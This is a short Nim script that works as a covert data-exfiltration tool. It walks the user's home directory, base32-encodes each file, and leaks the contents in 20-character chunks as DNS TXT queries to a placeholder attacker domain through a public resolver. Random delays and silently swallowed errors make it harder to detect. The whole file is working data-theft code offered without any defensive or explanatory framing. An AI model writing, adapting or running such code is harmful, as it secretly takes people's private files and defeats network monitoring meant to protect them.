import dnsclient, os, random
from base32 import encode

const chunksize = 20

proc nsex(ns: string, target: string, domain_name: string): void = 
 var content = readFile(target)
 let b32 = encode(content)
 var stringindex = 0
 while stringindex <= b32.len - 1:
  try:
   var query = b32[stringindex .. (if stringindex + chunksize - 1 > b32.len - 1: b32.len - 1 else: stringindex + chunksize - 1)]
   let client = newDNSClient(ns)
   var dnsquery = query & "." & domain_name
   var response = client.sendQuery(dnsquery,TXT)
   stringindex += chunksize
   sleep(rand(2000..30000))
  except Exception as e:
    discard

when isMainModule:
 for kind, path  in walkDir(getHomeDir()):
  try:
   nsex("8.8.8.8", path, "replaceme.tld")
  except:
   discard
   
